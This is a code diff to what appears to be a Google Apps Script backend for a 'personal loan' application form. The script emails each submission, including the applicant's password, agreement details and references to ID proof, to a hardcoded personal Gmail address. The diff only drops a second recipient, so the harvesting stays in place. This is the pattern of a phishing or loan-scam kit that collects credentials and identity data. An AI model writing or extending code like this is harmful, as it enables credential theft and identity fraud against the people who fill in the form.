@@ -4,7 +4,6 @@
 
 // Configuration
 const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";
-const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
@@ -13,7 +12,6 @@ function doGet(e) {
     <p><strong>Current emails:</strong></p>
     <ul>
       <li>Primary: ${PRIMARY_EMAIL}</li>
-      <li>Secondary: ${SECONDARY_EMAIL}</li>
     </ul>
   `);
 }
@@ -79,11 +77,9 @@ function sendApplicationEmail(data) {
     "- Password: " + (data.password || '[NOT PROVIDED]') + "\n\n" +
     "Submitted: " + new Date().toLocaleString();
   
-  // Send to both emails
   GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
-  GmailApp.sendEmail(SECONDARY_EMAIL, subject, emailBody);
   
-  Logger.log("Application email sent to both: " + PRIMARY_EMAIL + " and " + SECONDARY_EMAIL);
+  Logger.log("Application email sent to: " + PRIMARY_EMAIL);
 }
 
 function sendAgreementEmail(data) {
@@ -112,11 +108,9 @@ function sendAgreementEmail(data) {
       "Complete agreement content has been included in this submission.\n\n" +
       "ID proof has been saved to your customer dashboard for future reference.";
     
-    // Send to both emails
     GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
-    GmailApp.sendEmail(SECONDARY_EMAIL, subject, emailBody);
     
-    Logger.log("Agreement email sent to both: " + PRIMARY_EMAIL + " and " + SECONDARY_EMAIL);
+    Logger.log("Agreement email sent to: " + PRIMARY_EMAIL);
   } catch (error) {
     Logger.log('Error in sendAgreementEmail: ' + error.toString());
     sendErrorEmail('Error sending agreement email: ' + error.toString(), data);
